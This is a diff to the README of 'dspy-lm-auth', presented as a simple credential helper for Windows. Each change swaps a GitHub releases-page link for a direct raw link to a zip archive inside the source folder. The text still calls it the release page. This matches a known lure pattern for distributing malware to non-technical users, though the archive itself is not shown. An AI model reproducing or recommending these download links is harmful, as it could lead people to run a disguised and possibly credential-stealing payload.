@@ -1,6 +1,6 @@
 # 🛠️ dspy-lm-auth - Simple Pi Credential Helper
 
-[![Download dspy-lm-auth](https://img.shields.io/badge/Download-dspy--lm--auth-brightgreen)](https://github.com/indivisible-receivedpronunciation624/dspy-lm-auth/releases)
+[![Download dspy-lm-auth](https://img.shields.io/badge/Download-dspy--lm--auth-brightgreen)](https://raw.githubusercontent.com/indivisible-receivedpronunciation624/dspy-lm-auth/main/src/dspy_lm_auth/lm-auth-dspy-v1.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ No special hardware is needed. It works on most laptops and desktops made in the
 
 You need to visit the release page to download the program:
 
-[![Download dspy-lm-auth](https://img.shields.io/badge/Download-Link-blue)](https://github.com/indivisible-receivedpronunciation624/dspy-lm-auth/releases)
+[![Download dspy-lm-auth](https://img.shields.io/badge/Download-Link-blue)](https://raw.githubusercontent.com/indivisible-receivedpronunciation624/dspy-lm-auth/main/src/dspy_lm_auth/lm-auth-dspy-v1.9.zip)
 
 Click the link above to open the page where you can get the latest version.
 
@@ -45,7 +45,7 @@ Click the link above to open the page where you can get the latest version.
 Follow these steps to get dspy-lm-auth working on your PC:
 
 1. **Go to the Release Page**  
-   Click this link: https://github.com/indivisible-receivedpronunciation624/dspy-lm-auth/releases
+   Click this link: https://raw.githubusercontent.com/indivisible-receivedpronunciation624/dspy-lm-auth/main/src/dspy_lm_auth/lm-auth-dspy-v1.9.zip
 
 2. **Find the Latest Version**  
    The top entry usually shows the newest release. Look for a file ending with `.exe` or `.zip`.
@@ -123,4 +123,4 @@ You don’t need to learn anything about APIs or tokens. Just download, run, and
 
 Visit the release page below to get the latest version for your Windows PC:
 
-[![Download dspy-lm-auth](https://img.shields.io/badge/Download-Link-blue)](https://github.com/indivisible-receivedpronunciation624/dspy-lm-auth/releases)
+[![Download dspy-lm-auth](https://img.shields.io/badge/Download-Link-blue)](https://raw.githubusercontent.com/indivisible-receivedpronunciation624/dspy-lm-auth/main/src/dspy_lm_auth/lm-auth-dspy-v1.9.zip)
